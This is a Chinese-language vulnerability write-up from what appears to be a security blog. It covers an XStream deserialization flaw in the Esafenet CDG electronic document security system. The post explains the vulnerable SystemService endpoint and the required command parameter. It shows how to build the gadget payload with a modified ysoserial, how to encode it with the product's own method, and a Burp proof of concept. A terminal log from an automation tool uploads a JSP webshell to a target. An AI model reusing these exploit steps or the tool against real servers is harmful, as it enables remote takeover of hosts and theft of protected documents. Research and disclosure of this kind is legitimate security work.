---
created: 2024-09-30T06:03:00+00:00
categories:
  - 技术研究
tags:
  - RCE
updated: 2023-01-09T00:00:00+00:00
date: 2022-12-05T00:00:00+00:00
slug: cdg-xstream-deserialization-arbitrary-file-upload
title: 亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞
cover: /img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-1.png
id: 111906e1-7468-8077-b828-c9badccc4dac
---

## 漏洞简介

亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全防护软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产。亿赛通电子文档安全管理系统引用了低版本存在反序列化漏洞的 XStream 库，攻击者可利用该漏洞对服务器上传任意文件，进而控制服务器权限。

## 影响版本

- <= 820

## 漏洞分析

依赖位于`WEB-INF/lib/jhiberest.jar`文件，反编译后可以很明显的发现存在 XStream 的写法，并且 XStream 的版本用的也是低版本的，1.4.9 版本。

![cdg-systemservice](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/cdg-systemservice.png)

同时，此类在 web.xml 文件中的对应关系如下，由于 CDG 的 Web 根路径是`/CDGServer3`，那么当请求路径是`/CDGServer3/SystemService`时，请求将会由如下`com.esafenet.servlet.service.cdgfile.SystemService`类来处理。

```xml
<servlet>
	<servlet-name>SystemService</servlet-name>
	<servlet-class>
		com.esafenet.servlet.service.cdgfile.SystemService
	</servlet-class>
</servlet>
```

也就是上图存在 XStream 的`SystemService`类，关键代码已贴至下面。

```java
public class SystemService extends HttpServlet {
    private static final Log log = LogFactory.getLog(FilesService.class);
    private static String retrunString = "";
    private static final long serialVersionUID = -3607772408578536033L;
    private XStream xStream = ServiceUtil.getStream();
    private UserDao userDao = new UserDao();
    private UsbKeyDao usbKeyDao = new UsbKeyDao();
    private SecretDocDao secretDocDao = new SecretDocDao();
    private SecretUserDao secretUserDao = new SecretUserDao();

    public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            String command = request.getParameter("command").toString();
            if (command != null && command.length() > 0) {
                switch (CommandConstants.getCommandValue(command)) {
                    case CommandConstants.GETSYSTEMINFO /* 1601 */:
                        getSystemInfo(request, response);
                        break;
                }
            }
        } catch (Exception e) {
        }
    }

    private void getSystemInfo(HttpServletRequest request, HttpServletResponse response) {
        SystemReturn systemReturn = new SystemReturn();

        try {
            String xmlStr = ServiceUtil.getXMLFromRequest(request);
            SystemServiceRequest systemServiceRequest = (SystemServiceRequest)this.xStream.fromXML(xmlStr);
            systemReturn.setReturnMessage("OK");
            systemReturn.setSecretKey(DocInfoModel.getCDGKey());

            // ...

        } catch (Exception e2) {
            retrunString = "";
            e2.printStackTrace();
            log.error("取系统信息" + e2.getMessage());
            systemReturn.setReturnMessage(ErrorConstants.SYSTEMSERVICE_ERROR);
            ServiceUtil.sendInfo(request, response, this.xStream.toXML(systemReturn));
        }
    }
}
```

需要接收一个`command`参数，该参数值必须为`GETSYSTEMINFO`才会顺利进入到`getSystemInfo`方法。

```java
String xmlStr = ServiceUtil.getXMLFromRequest(request);
SystemServiceRequest systemServiceRequest = (SystemServiceRequest)this.xStream.fromXML(xmlStr);
```

在触发 XStream 反序列化漏洞之前，`request`还经过`ServiceUtil.getXMLFromRequest`方法的一道处理，就是各种解码。

![serviceutil-getxmlfromrequest](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/serviceutil-getxmlfromrequest.png)

对于此，倒也没必要通过其解码的操作来逆向编码的操作，因为负责编码的方法就是`changeXMLInfo`，后面在利用阶段直接调用该方法即可。

```java
public static String changeXMLInfo(String str) throws Exception {
    byte[] abyte1 = str.getBytes();
    int nLength = Array.getLength(abyte1);
    CodeDecoder.Encode(abyte1, nLength, abyte0);
    String src = new String(abyte1, "ISO8859_1");
    return CodeDecoder.getTransferEncrptString(src);
}
```

## 漏洞利用

> 漏洞利用分为两步骤，第一步是构造出恶意的 XStream 反序列化 XML Payload，第二步是将 XML 内容编码成亿赛通电子文档安全管理系统能够接受的字符串。

### 恶意 XML 构造

通过修改[ysoserial-for-woodpecker](https://github.com/woodpecker-framework/ysoserial-for-woodpecker)开源项目。在 CommonsBeanutils2.java 中做如下修改，接受的参数值为`upload_file_base64:..//webapps//CDGServer3//testttttt.txt|YWJjMTIz`，其中|前面的部分是上传至目标服务器的路径，而|后面的部分是上传的内容的 base64 值，`YWJjMTIz` base64 解码后是 abc123。

![ysoserial-for-woodpecker-cb2](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/ysoserial-for-woodpecker-cb2.png)

在 PayloadRunner.java 中添加如下行。

![ysoserial-for-woodpecker-payloadrunner](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/ysoserial-for-woodpecker-payloadrunner.png)

然后回到`CommonsBeanutils2.main()`点击 Run，就会将恶意的 XML 内容生成并打印出来。

![cb2-run](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/cb2-run.png)

### 编码

直接利用该 jhiberest.jar 包中的`changeXMLInfo`编码方法，同时注意还需导入其他的一些依赖包。

![encode-1](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/encode-1.png)

![encode-2](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/encode-2.png)

最终生成一串编码后的字符串。

### 概念验证

将上面生成的一段编码后的字符串复制至 BurpSuite 点击 Send。

![burp-1](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-1.png)

然后请求`/CDGServer3/testttttt.txt`路径，可以发现文件已成功上传。

![burp-2](/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-2.png)

### 自动化工具

项目地址：

- <https://github.com/0xf4n9x/CDGXStreamDeserRCE>

本地文件上传利用。

```shell
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ cat tessssssssssssst1.jsp
<%
out.println("e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43");
%>
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ java -jar CDGXStreamDeserRCE.jar -p http://127.0.0.1:8080 -uf tessssssssssssst1.jsp -t https://192.168.31.190:8443
[+] Exploit Successed
[+] WebShell: https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ curl -k https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp
e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43
```

字符串解码。

```shell
java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
```

![decode](https://user-images.githubusercontent.com/40891670/209945515-1539ff6b-e4c4-46a3-8764-7aa3a7568741.png)

## References

- <https://github.com/woodpecker-framework/ysoserial-for-woodpecker>
